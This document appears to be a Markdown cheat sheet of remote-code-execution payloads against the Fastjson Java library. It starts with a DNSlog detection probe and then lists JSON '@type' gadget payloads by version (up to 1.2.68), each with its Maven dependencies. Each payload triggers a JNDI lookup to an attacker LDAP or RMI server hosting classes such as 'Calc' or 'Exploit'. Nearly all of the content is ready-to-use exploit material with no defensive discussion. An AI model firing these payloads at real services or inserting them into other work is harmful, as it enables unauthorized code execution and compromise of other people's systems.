## Ref
- http://dream0x01.com/spear-framework/#/fastjson/fastjson
- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce



## fastjson detection
```json
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
```

## poc for all versions

### <= 1.2.68 org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig
pom.xml:
```xml
        <dependency>
            <groupId>org.apache.hadoop</groupId>
            <artifactId>hadoop-client-minicluster</artifactId>
            <version>3.2.1</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:43658/Calc"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:43658/Calc"}
```

### <= 1.2.66 org.apache.shiro.realm.jndi.JndiRealmFactory
pom.xml:
```xml
        <!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-core -->
        <dependency>
            <groupId>org.apache.shiro</groupId>
            <artifactId>shiro-core</artifactId>
            <version>1.2.4</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://shiro.5a8a62c8cc78196e6377.d.zhack.ca:43658/Calc"], "Realms":[""]}
```


### <= 1.2.62 org.apache.xbean.propertyeditor.JndiConverter
pom.xml:
```xml
        <!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-reflect -->
        <dependency>
            <groupId>org.apache.xbean</groupId>
            <artifactId>xbean-reflect</artifactId>
            <version>4.16</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://localhost:1389/Calc"}
```


### <= 1.2.62 com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig
pom.xml:
```xml
<dependency>
    <groupId>org.apache.ibatis</groupId>
    <artifactId>ibatis-sqlmap</artifactId>
    <version>2.3.4.726</version>
</dependency>
```

poc:
```json
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.85.1:1389/calc"}}
```

### <= 1.2.62 org.apache.cocoon.components.slide.impl.JMSContentInterceptor
pom.xml:
```xml
        <dependency>
            <groupId>slide</groupId>
            <artifactId>slide-kernel</artifactId>
            <version>2.1</version>
        </dependency>
        <dependency>
            <groupId>cocoon</groupId>
            <artifactId>cocoon-slide</artifactId>
            <version>2.1.11</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://192.168.85.1:1389/calc"}, "namespace":""}
```
in which `"java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory",` is essential.


### <=1.2.62 br.com.anteros.dbcp.AnterosDBCPConfig
pom.xml
```
        <dependency>
            <groupId>com.codahale.metrics</groupId>
            <artifactId>metrics-healthchecks</artifactId>
            <version>3.0.2</version>
        </dependency>
        <dependency>
            <groupId>br.com.anteros</groupId>
            <artifactId>Anteros-Core</artifactId>
            <version>1.2.1</version>
        </dependency>
        <dependency>
            <groupId>br.com.anteros</groupId>
            <artifactId>Anteros-DBCP</artifactId>
            <version>1.0.1</version>
        </dependency>
```

poc:
```json
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://192.168.85.1:1389/Calc"}
```


### <=1.2.59 org.apache.commons.proxy.provider.remoting.SessionBeanProvider
pom.xml:
```xml
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-proxy</artifactId>
            <version>1.0</version>
        </dependency>
```
poc:
```json
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://192.168.85.1:1389/Calc","Object":"a"}
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://192.168.85.1:1389/Calc"}
```

### <=1.2.59 com.zaxxer.hikari.HikariConfig
pom.xml:
```xml
        <!-- https://mvnrepository.com/artifact/hikari-cp/hikari-cp -->
        <dependency>
          <groupId>com.zaxxer</groupId>
          <artifactId>HikariCP</artifactId>
          <version>3.4.1</version>
        </dependency>
```

poc:
```json
{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://192.168.85.1:1389/Calc"}
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://192.168.85.1:1389/Calc"}
```



### MISC
#### 1.2.24
```json
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}}
```

#### 未知版本(1.2.24-41之间)
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

#### 1.2.41
```json
{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

#### 1.2.42
```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true};
```

#### 1.2.43
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true]}
```

#### 1.2.45
```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}
```

#### 1.2.47
```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}
```
